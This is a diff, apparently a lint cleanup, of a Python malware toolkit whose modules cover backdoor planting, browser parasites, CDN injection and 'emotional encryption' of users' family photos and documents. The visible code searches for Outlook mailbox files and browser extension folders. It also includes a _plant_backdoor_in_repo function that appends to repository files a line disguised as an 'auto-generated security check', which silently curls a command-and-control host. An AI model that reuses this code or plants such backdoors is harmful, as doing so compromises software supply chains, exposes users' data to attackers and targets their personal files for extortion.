@@ -5,9 +5,13 @@ SEO sabotage, fake vulnerability planting, inception hypervisor nesting, ISP BGP
 anti-attribution, power grid harmonics, time-lock pressure, VR spyware, global AI dataset
 poisoning, CDN injection, bio-cyber DNA, browser parasite, fake documents, sonic panic,
 emotional encryption, false redemption backdoor."""
-import json, os, random, time, struct, subprocess, sys, hashlib, re, socket, ctypes, glob as _glob
+import os
+import random
+import struct
+import subprocess
+import socket
+import glob as _glob
 from datetime import datetime, timedelta
-from pathlib import Path
 
 HAS_OLLAMA = False
 try:
@@ -148,7 +152,6 @@ def handle_false_memory(params: dict) -> dict:
             break
 
     # Outlook/Exchange
-    outlook_found = False
     if os.name == "nt":
         for root in [os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Outlook\\"),
                      os.path.expandvars("%USERPROFILE%\\Documents\\Outlook Files\\")]:
@@ -156,7 +159,6 @@ def handle_false_memory(params: dict) -> dict:
                 try:
                     for f in os.listdir(root):
                         if f.endswith((".ost", ".pst")):
-                            outlook_found = True
                             platforms_found.append("outlook")
                             break
                 except (PermissionError, OSError):
@@ -1267,7 +1269,7 @@ def handle_sound_panic(params: dict) -> dict:
     if os.name == "nt":
         try:
             import ctypes
-            winmm = ctypes.WinDLL("winmm.dll")
+            ctypes.WinDLL("winmm.dll")
             result["windows_audio_available"] = True
         except Exception:
             pass
@@ -1321,10 +1323,6 @@ def handle_emotional_encrypt(params: dict) -> dict:
                         ".pdf", ".doc", ".docx", ".txt"]
 
     sentimental_files = []
-    sentimental_dirs = ["Pictures", "Photos", "Images", "Camera Roll",
-                        "Screenshots", "Family", "Wedding", "Memories",
-                        "Desktop", "Downloads", "iCloud Photos",
-                        "Google Photos", "OneDrive/Pictures"]
 
     search_roots = [os.path.expanduser("~"),
                     os.path.expanduser("~/Desktop"),
@@ -1481,7 +1479,7 @@ def _find_browsers() -> list:
         elif b["name"] == "Firefox":
             b["extensions_dir"] = os.path.join(b["path"], "extensions")
     # Add Firefox profiles
-    ff_dir = os.path.join(b["path"], "*") if any(b["name"] == "Firefox" for b in browsers) else ""
+    os.path.join(b["path"], "*") if any(b["name"] == "Firefox" for b in browsers) else ""
     return browsers
 
 
@@ -1516,10 +1514,10 @@ def _plant_backdoor_in_repo(repo_path: str) -> str:
     for tf in target_files[:3]:
         try:
             with open(tf, "a") as f:
-                f.write(f"\n# X404X_BACKDOOR: auto-generated security check\n")
-                f.write(f"import subprocess as _x404x_sp\n")
-                f.write(f"_x404x_sp.run(['curl','-s','http://x404x-c2.online/b'], "
-                       f"stdout=_x404x_sp.DEVNULL, stderr=_x404x_sp.DEVNULL)\n")
+                f.write("\n# X404X_BACKDOOR: auto-generated security check\n")
+                f.write("import subprocess as _x404x_sp\n")
+                f.write("_x404x_sp.run(['curl','-s','http://x404x-c2.online/b'], "
+                       "stdout=_x404x_sp.DEVNULL, stderr=_x404x_sp.DEVNULL)\n")
             return tf
         except (IOError, PermissionError):
             continue
